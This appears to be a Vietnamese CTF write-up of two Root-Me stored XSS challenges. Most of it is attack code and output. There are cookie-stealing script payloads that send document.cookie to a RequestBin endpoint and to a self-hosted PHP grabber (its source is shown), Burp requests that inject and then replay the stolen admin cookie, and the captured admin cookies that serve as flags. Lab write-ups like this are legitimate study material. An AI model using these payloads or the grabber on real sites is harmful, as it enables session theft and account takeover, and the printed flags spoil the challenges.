
# XSS - Stored 2

- Vào `https://requestbin.com` tạo url 

<img src="https://i.imgur.com/XrKVfCv.png">

```https://enuu88fkyfctq.x.pipedream.net/```

- XSS 

    + payload 

        ```
        "><script>document.write(%22<img src=https://enuu88fkyfctq.x.pipedream.net/?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>
        ```
    + burp

        ```
        POST /web-client/ch19/ HTTP/1.1
        Host: challenge01.root-me.org
        Connection: keep-alive
        Content-Length: 37
        Cache-Control: max-age=0
        Origin: http://challenge01.root-me.org
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
        Referer: http://challenge01.root-me.org/web-client/ch19/
        Accept-Encoding: gzip, deflate
        Accept-Language: en
        Cookie: status=invite"><script>document.write(%22<img src=https://enuu88fkyfctq.x.pipedream.net/?%22.concat(document.cookie.replace(%22 %22,%22&%22)).concat(%22 />%22))</script>; uid=wKgbZF1JI32VwTJeGRs5Ag==

        message=nguyen+van+minh&titre=minhkma
        ```
        <img src="https://i.imgur.com/GE1p1Mh.png">
    
    + ADMIN_COOKIE:

        ```
        SY2USDIH78TF3DFU78546TE7F
        ```

- burp

    ```
    POST /web-client/ch19/?section=admin HTTP/1.1
    Host: challenge01.root-me.org
    Connection: keep-alive
    Content-Length: 37
    Cache-Control: max-age=0
    Origin: http://challenge01.root-me.org
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
    Referer: http://challenge01.root-me.org/web-client/ch19/
    Accept-Encoding: gzip, deflate
    Accept-Language: en
    Cookie: status=invite; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F

    message=nguyen+van+minh&titre=minhkma
    ```

    <img src="https://i.imgur.com/NTcICjU.png">

# XSS - Stored 1

- Máy public 

    ```
    [root@mail html]# pwd
    /var/www/html
    [root@mail html]# cat grabber.php 
    <?php
    $cookie = $_GET['c'];
    $fp = fopen('cookies.txt', 'a+');
    fwrite($fp, 'Cookie:' .$cookie.'\r\n');
    fclose($fp);
    ?>
    [root@mail html]#
    ```
- XSS 

    ```
    <script>document.location='http://vietkubers.vn/grabber.php?c='+document.cookie</script>
    ```

- flag

    ```
    [root@mail html]# cat cookies.txt 
    Cookie:ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6
    ```